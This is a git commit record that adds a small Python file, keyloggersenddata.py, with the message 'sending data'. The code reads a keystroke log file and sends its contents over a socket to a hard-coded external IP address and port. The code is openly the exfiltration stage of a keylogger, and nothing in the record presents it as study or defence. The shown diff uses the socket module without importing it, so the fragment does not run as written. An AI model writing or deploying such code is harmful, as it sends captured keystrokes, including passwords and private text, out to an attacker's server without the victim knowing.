9b3dd2eeb97b4b7f48f1501fa1b4bce5cc57531e
jinruan <jruan6377@bths.edu>
2016-05-08 20:00:32 -0400

    sending data

---
+++ keyloggersenddata.py
@@ -0,0 +1,11 @@
+#=============================================
+#sending txt file
+
+f = open('keylogtest.txt', 'r')
+strf = str(f.read())
+print(strf)
+eggs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+eggs.connect(('107.170.79.196', 9010))
+eggs.sendall(strf)
+
+print("done")
